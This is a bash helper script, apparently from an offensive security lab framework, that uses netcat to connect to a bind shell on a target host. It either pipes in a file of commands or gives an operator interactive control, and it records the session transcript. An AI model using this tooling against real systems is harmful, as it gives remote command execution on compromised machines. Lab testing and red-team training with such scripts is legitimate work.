#!/usr/bin/env bash
#
# deliveries/shared/client.sh
#
# Simple bash/nc client helper for connecting to bind shells.
#
# Intended for:
#   - bind_shell/bash_auto.conf
#   - bind_shell/bash_manual.conf
#
# Environment variables:
#
#   TARGET_HOST
#   LPORT
#   AUTOMATED
#   COMMANDS_FILE
#   TRANSCRIPT_FILE
#
# Defaults:
#
#   LPORT=4444
#   TRANSCRIPT_FILE=shell_transcript.log
#
# Notes:
#
#   - In automated mode, commands are piped into the shell session.
#   - In manual mode, the operator interacts directly.
#   - Transcript recording uses tee.
#
# This is intended only for local lab environments.

set -euo pipefail

FRAMEWORK_ROOT="${FRAMEWORK_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)}"
source "$FRAMEWORK_ROOT/lib/log_utils.sh"

require_command() {
    local cmd="$1"

    command -v "$cmd" >/dev/null 2>&1 || \
        fail "Missing required command: $cmd"
}

require_command nc
require_command tee

TARGET_HOST="${TARGET_HOST:-}"
LPORT="${LPORT:-4444}"

AUTOMATED="${AUTOMATED:-false}"

COMMANDS_FILE="${COMMANDS_FILE:-}"
TRANSCRIPT_FILE="${TRANSCRIPT_FILE:-shell_transcript.log}"

[[ -n "$TARGET_HOST" ]] || \
    fail "TARGET_HOST must be set"

log "Starting bind-shell client"
log "Target: $TARGET_HOST"
log "Port: $LPORT"
log "Automated: $AUTOMATED"

if [[ "$AUTOMATED" == "true" ]]; then

    [[ -n "$COMMANDS_FILE" ]] || \
        fail "COMMANDS_FILE must be set in automated mode"

    [[ -f "$COMMANDS_FILE" ]] || \
        fail "Missing commands file: $COMMANDS_FILE"

    log "Using commands file: $COMMANDS_FILE"

    nc "$TARGET_HOST" "$LPORT" \
        < "$COMMANDS_FILE" \
        | tee "$TRANSCRIPT_FILE"

else

    log "Manual interaction mode active"

    nc "$TARGET_HOST" "$LPORT" \
        | tee "$TRANSCRIPT_FILE"

fi

log "Client complete"
